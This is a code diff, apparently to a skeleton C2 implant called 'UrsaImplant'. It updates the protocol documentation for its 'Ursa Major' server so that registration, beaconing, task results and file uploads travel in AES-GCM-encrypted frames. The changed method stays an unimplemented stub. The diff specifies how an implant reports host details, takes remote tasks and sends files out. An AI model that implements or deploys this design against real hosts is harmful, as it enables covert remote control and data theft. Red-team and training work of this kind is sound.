@@ -20,15 +20,15 @@ PROTOCOL
 Ursa Major (major/server.py) expects:
 
     POST /register  body: {hostname, username, os, arch, pid, process}
-                    resp: {session_id: str, key: str (32-byte hex)}
+                    resp: {session_id: str, key: str (32-byte hex), crypto: {...}}
 
-    POST /beacon    body: {session_id: str}
-                    resp: {tasks: [{id, type, args}]}
+    POST /beacon    body: {session_id: str, encrypted?: true}
+                    resp: {data: AES-GCM frame} or {tasks: [{id, type, args}]}
 
-    POST /result    body: {session_id, task_id, result, error}
+    POST /result    body: {session_id, task_id, encrypted?: true, data?: AES-GCM frame}
                     resp: {ok: true}
 
-    POST /upload    body: {session_id, filename, data: base64}
+    POST /upload    body: {session_id, encrypted?: true, data?: AES-GCM frame}
                     resp: {file_id: str}
 
     GET  /download/{file_id}
@@ -114,7 +114,7 @@ class UrsaImplant:
         """Register with C2. Store session_id. Return session_id string.
 
         POST /register with host metadata dict.
-        The server returns {session_id: str, key: str}.
+        The server returns {session_id: str, key: str, crypto: dict}.
         Store both on self for use in subsequent requests.
         """
         raise NotImplementedError
